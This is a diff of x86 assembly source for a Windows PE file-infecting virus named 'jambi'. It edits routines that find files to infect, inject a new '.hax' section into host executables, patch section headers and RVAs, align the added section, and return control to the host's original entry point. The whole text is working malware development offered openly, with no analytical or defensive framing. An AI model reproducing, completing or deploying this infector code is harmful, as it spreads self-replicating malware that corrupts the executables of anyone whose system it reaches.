@@ -80,13 +80,11 @@ deltaoffset:
     call    find_file
 
     mov     eax,ebp ; EBP -> real address of delta offset
-    add     eax,offset jambi_end
+    add     eax,offset jambi_end ; @jambi end we have the original entry point
     sub     eax,offset deltaoffset
-    mov     eax,[eax]
-    add     eax,esi
+    mov     eax,[eax] ; Get it
 
-    jmp     eax
-
+    jmp     eax ; Add Image Base Address
 
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ; Find first file to infect
@@ -547,7 +545,7 @@ new_code_section:
     push    [ebp+20]
     call    ebx
 
-    ; Read Size of Image
+      ; Read Size of Image
     mov     ebx,[ebp-16]
     push    0
     push    0
@@ -556,7 +554,7 @@ new_code_section:
     push    [ebp+20]
     call    ebx
 
-    ; get number of section
+    ; update it
     mov ecx,[esi]
     add ecx,1000h
     mov [esi],ecx
@@ -601,7 +599,7 @@ new_code_section:
     push    [ebp+20]
     call    ebx
 ;;;; lololl!11201
-    ; Move to Size of code
+    ; Move to Base of code
     mov     ebx,[ebp-24]
     push    FILE_CURRENT
     push    0
@@ -609,7 +607,7 @@ new_code_section:
     push    [ebp+20]
     call    ebx
 
-    ; Write the updated number of section
+    ; Write the new section's RVA (.hax)
     mov     ebx,[ebp-20]
     push    0
     push    0
@@ -619,7 +617,27 @@ new_code_section:
     push    [ebp+20]
     call    ebx
 
+    ; Move to Base of code
+    mov     ebx,[ebp-24]
+    push    FILE_CURRENT
+    push    0
+    push    4
+    push    [ebp+20]
+    call    ebx
 
+    ; Read Base of code
+    mov     ebx,[ebp-16]
+    push    0
+    push    0
+    push    4
+    push    esi
+    push    [ebp+20]
+    call    ebx
+
+    mov     eax,[esi] ; Get base of code
+    mov     ebx,[esi+20] ; Get old entry point
+    add     ebx,eax ; Compute the old entry point Address
+    mov     [esi+20],ebx ; Update it
 
     ; Move to future new section
     mov     ebx,[ebp-24]
@@ -785,7 +803,19 @@ image_section_done:
     mov     ebx,[edx] ; Virtual size
     mov     ecx,[edx+4] ; RVA
     add     ebx,ecx ; New RVA
-    push    ebx ; RVA
+rva_align:
+    mov     ecx,ebx ; save NEW RVA
+    mov     edx,0
+    mov     eax,ebx
+    mov     ebx,1000h
+    div     ebx ; result in eax
+    mov     ebx,1000h
+    mul     ebx ; result in eax
+    cmp     ecx,eax ; compare previous and new RVA
+    je      rva_nopad
+    add     eax,1000h ; huge padding :p
+rva_nopad:
+    push    eax ; RVA
 
 
     mov     edx,[ebp+36]
